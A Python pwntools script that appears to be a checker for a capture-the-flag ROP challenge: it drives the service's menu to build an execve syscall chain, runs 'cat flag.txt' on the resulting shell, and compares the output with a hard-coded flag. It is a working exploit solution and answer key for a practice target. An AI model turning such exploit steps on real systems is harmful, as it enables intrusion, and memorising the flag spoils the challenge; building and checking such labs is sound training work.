import socket
import pwn


def read_until(io, s):
    ret = b""
    while ret.find(s) == -1:
        ret += io.read(1)
    return ret


def get_flag_msg(ret):
    flag_start = ret.find(b"FLAG{")
    print(flag_start)
    flag_end = ret.find(b"}", flag_start)
    print(flag_end)
    return ret[flag_start : flag_end + 1]


def check_pwn_rop_machine_normal(hostname):
    try:
        io = pwn.remote(hostname, 9004, timeout=3)
    except:
        return 2

    try:
        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"2\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"1\n")

        ret = read_until(io, b"?: ")
        print(ret)
        io.send(b"0x404070\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"3\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"1\n")

        ret = read_until(io, b"?: ")
        print(ret)
        io.send(b"0x0\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"4\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"1\n")

        ret = read_until(io, b"?: ")
        print(ret)
        io.send(b"0x0\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"5\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"1\n")

        ret = read_until(io, b"?: ")
        print(ret)
        io.send(b"0x3b\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"6\n")

        ret = read_until(io, b"> ")
        print(ret)
        io.send(b"0\n")

        io.send(b"cat flag.txt\n")
        ret = read_until(io, b"}")
        print(ret)
        flag = get_flag_msg(ret)
        print(flag)

        if flag == b"FLAG{now-you-can-call-any-system-calls-with-syscall}":
            return 0
        return 1

    except Exception as e:
        print(e)
        return 1

    finally:
        io.close()


if __name__ == "__main__":
    ret = check_pwn_rop_machine_normal("localhost")
    if ret == 0:
        print("alive")
